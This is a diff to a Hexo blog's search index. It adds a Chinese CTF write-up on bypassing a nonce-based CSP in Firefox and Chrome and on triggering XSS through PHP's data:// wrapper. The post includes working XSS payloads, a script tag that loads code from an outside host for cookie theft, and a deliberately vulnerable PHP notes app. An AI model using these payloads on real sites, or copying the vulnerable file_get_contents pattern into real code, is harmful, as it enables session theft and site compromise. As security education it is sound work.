@@ -1,8 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[XSS--CSP绕过【firefox和chrome】和data://协议的使用]]></title>
+    <url>%2F2018%2F12%2F08%2Fxss-1%2F</url>
+    <content type="text"><![CDATA[最近做一道关于XSS的CTF题目，用到了data://协议触发XSS，并且需要绕过带nonce的CSP策略。由于题目环境没有了，这里主要总结一下其中用到的一些技巧。 ##CSP绕过在绕过csp策略的时候，找到了以下这篇文章https://www.jianshu.com/p/f1de775bc43e 由于使用了CSP策略，一般想要获取cookie的方法，主要是使用以下几种跳转语句。 对于带有nonce的CSP策略，要执行跳转语句可以使用这种方式绕过，但是由于Chrome和Firefox对于标签的补齐和解析使用了不一样的方式，因此这个绕过的payload有些不一样。 在firefox上可以直接使用上述的payload，只要把跳转语句写入 src 指向的文件//14.rs就可以了，因为属性 a 后面的 &quot; 会被优先解析，这样就会把里面的&lt;/p&gt; &lt;script id=解析成字符串，从而成功引入了带有nonce的script，从而成功执行src里的内容。 Chrome对于标签的解析方式则不同，虽然它也是这样补齐了标签，但是解析的时候仍然会优先解析&quot;里的script，导致发生错误，无法实现xss。在这种情况下，只需要使用Chrome解析html5 的属性的一种特性——浏览器只会解析同一个标签内的第一个属性，对于后面的同名属性，会自动忽略掉。因此，只要改一下payload： 12345&lt;script src=//14.rs a=&quot;test&quot; a=&quot; //这样会把后面 a=&quot;&lt;/p&gt;&lt;script id=&quot;给直接忽略掉或者&lt;script src=//14.rs src=&quot;//把src后面的内容直接忽略 由此可以成功引入带有nonce的&lt;script&gt;标签，成功执行XSS。 ##data://协议使用在XSS的时候，可能常常会用到php伪协议的辅助，比如这样两种情况： 对于提交的内容，通过htmlspecialchars()函数来转义特殊字符，然后保存到某个文件里，之后通过文件包含，把文件的内容输出到某个html标签之间。 对于提交的内容，通过htmlspecialchars()函数来转义特殊字符，然后把内容在某个HTML标签内输出出来。 在这种情况下，怎么去触发XSS呢？这个时候，可以考虑使用data://这个协议：只要把红框中的内容修改成&lt;script&gt;alert(1)&lt;script&gt;的base64编码JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==就可以触发xss了。 ###实例使用php实现一个简单的笔记上传保存到文件里，并显示到网页的功能：getnote.php:1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;dataXSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;upnote.php&quot; method=&quot;post&quot;&gt; &lt;p&gt;note:&lt;/p&gt; &lt;input type=&quot;text&quot; name=&quot;note&quot; &gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;&lt;?php$url = $_GET[&apos;url&apos;];echo &quot;&lt;p&gt;your input url:&lt;/p&gt;&quot;.&quot;&lt;p&gt;&quot;.urldecode(file_get_contents($url)) .&quot;&lt;/p&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt; upnote.php1234&lt;?phpfile_put_contents(&apos;url.txt&apos;,htmlspecialchars($_POST[note]));header(&apos;location:getnote.php?url=url.txt&apos;);?&gt; 程序的逻辑很简单，不多介绍。首先我们访问：getnote.php，把笔记的内容写成&lt;script&gt;alert(1)&lt;/script&gt;，然后提交： 没有发生弹框，检查元素可以发现&lt;,&gt;都被htmlspecialchars()转义了，看一下文件内容发现也被转义了，如下图： 这个时候，我们发现读取url的函数使用的是file_get_contents($url)，因此可以使用data://协议，构造下面的payload:1getnote.php?url=data://text/plain;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ== 访问，发现弹框了。]]></content>
+      <categories>
+        <category>web security</category>
+      </categories>
+      <tags>
+        <tag>xss</tag>
+        <tag>CSP</tag>
+        <tag>data://</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Hello World]]></title>
     <url>%2F2018%2F12%2F08%2Fhello-world%2F</url>
     <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
+      <categories>
+        <category>blog</category>
+      </categories>
+      <tags>
+        <tag>hexo，next</tag>
+      </tags>
   </entry>
 </search>
